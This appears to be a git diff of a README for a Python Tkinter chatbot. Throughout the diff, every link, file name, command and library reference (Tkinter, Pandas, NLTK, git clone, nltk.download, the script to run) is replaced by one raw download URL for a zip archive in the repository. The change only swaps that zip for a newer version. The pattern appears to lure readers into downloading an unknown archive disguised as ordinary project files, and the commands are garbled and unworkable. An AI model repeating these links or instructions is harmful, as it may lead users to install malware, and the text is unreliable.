@@ -6,7 +6,7 @@ Panda Interface is a simple chatbot application built using Python and Tkinter. 
 
 
 # Output
-![IMG-20240801-WA0028](https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip)
+![IMG-20240801-WA0028](https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip)
 
 ## Features
 
@@ -30,7 +30,7 @@ Before you begin, ensure you have met the following requirements:
 1. Clone this repository to your local machine:
 
     ```bash
-    git clone https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip
+    git clone https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip
     cd panda-interface-chatbot
     ```
 
@@ -44,19 +44,19 @@ Before you begin, ensure you have met the following requirements:
 
     ```python
     import nltk
-    https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip('stopwords')
-    https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip('punkt')
-    https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip('wordnet')
+    https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip('stopwords')
+    https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip('punkt')
+    https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip('wordnet')
     ```
 
-4. Place your dataset (`https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip`) in the project directory.
+4. Place your dataset (`https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip`) in the project directory.
 
 ## Usage
 
-1. Run the `https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip` script:
+1. Run the `https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip` script:
 
     ```bash
-    python https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip
+    python https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip
     ```
 
 2. A GUI window will open. You can type your question in the entry box and click 'Send' or choose from predefined options.
@@ -64,17 +64,17 @@ Before you begin, ensure you have met the following requirements:
 ## Project Structure
 
 
-- `https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip`: The main script containing the chatbot logic and GUI implementation.
-- `https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip`: The dataset file with 'Question' and 'Answer' columns.
-- `https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip`: This file.
+- `https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip`: The main script containing the chatbot logic and GUI implementation.
+- `https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip`: The dataset file with 'Question' and 'Answer' columns.
+- `https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip`: This file.
 
 ## Acknowledgments
 
 This project uses the following libraries:
 
-- [Tkinter](https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip)
-- [Pandas](https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip)
-- [NLTK](https://github.com/Niranjan-008/Edunet-AI-Cloud/raw/refs/heads/main/dogly/Cloud_Edunet_A_v2.4.zip)
+- [Tkinter](https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip)
+- [Pandas](https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip)
+- [NLTK](https://raw.githubusercontent.com/Niranjan-008/Edunet-AI-Cloud/main/dogly/Cloud_A_Edunet_2.5.zip)
 
 ## License
 
